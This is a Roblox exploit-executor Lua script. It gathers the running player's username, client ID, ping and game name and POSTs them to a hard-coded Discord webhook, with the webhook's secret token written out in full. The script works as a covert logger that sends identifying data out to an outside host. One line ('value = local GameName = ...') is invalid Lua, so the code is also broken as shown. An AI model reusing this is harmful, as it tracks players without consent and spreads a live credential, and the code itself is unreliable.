local webh = "https://discord.com/api/webhooks/1033362590446919680/nCzUUuQ0f66JPNIJL0IL4S85eQWFGMe41Ep27fYhEOGzHxkDnyR4Fifc6UAqQ-Y7olH6"


pcall(function()
   local data = {

  ['embeds'] = {
    {
       ['title'] = '`Script, injected`***!***',
       ['description'] = '',
       ['fields'] = {
          {name = '*Roblox User*', value = game:GetService("Players").LocalPlayer.Name},
          {name = '*Hard ware id;*', value = game:GetService("RbxAnalyticsService"):GetClientId()},
          {name = "*Ping;*", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
          {name = "*Game;*", value = local GameName = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name}

        }
    }
  }
}

   if syn then
       local response = syn.request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif request then
       local response = request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   elseif http_request then
       local response = http_request(
           {
               Url = webh,
               Method = 'POST',
               Headers = {
                   ['Content-Type'] = 'application/json'
               },
               Body = game:GetService('HttpService'):JSONEncode(data)
           }
       );
   end
end)